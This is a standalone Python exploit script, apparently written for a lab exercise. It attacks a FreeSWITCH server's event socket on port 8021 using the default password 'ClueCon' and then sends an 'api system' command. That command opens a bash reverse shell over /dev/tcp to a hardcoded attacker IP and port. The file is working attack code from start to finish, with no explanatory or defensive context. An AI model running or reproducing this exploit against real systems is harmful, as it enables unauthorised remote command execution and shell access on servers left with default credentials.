#!/usr/bin/python3

from socket import *
import sys

if len(sys.argv) != 2:
    print('Missing arguments')
    print('Usage: freeswitch-exploit.py <target>')
    sys.exit(1)

ADDRESS = sys.argv[1]
REVERSE_IP = '192.168.45.193'  # Attacker IP
REVERSE_PORT = '4444'  # Attacker Port
PASSWORD = 'ClueCon'  # Default password for FreeSWITCH

# Define simpler reverse shell command
CMD = f'/bin/bash -i >& /dev/tcp/{REVERSE_IP}/{REVERSE_PORT} 0>&1'

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))

response = s.recv(1024)
if b'auth/request' in response:
    s.send(bytes(f'auth {PASSWORD}\n\n', 'utf8'))
    response = s.recv(1024)
    if b'+OK accepted' in response:
        print('Authenticated')
        print(f'Sending command: api system {CMD}')
        # Sending reverse shell command
        s.send(bytes(f'api system {CMD}\n\n', 'utf8'))
        response = s.recv(8096).decode()
        print(response)
    else:
        print('Authentication failed')
        sys.exit(1)
else:
    print('Not prompted for authentication, likely not vulnerable')
    sys.exit(1)
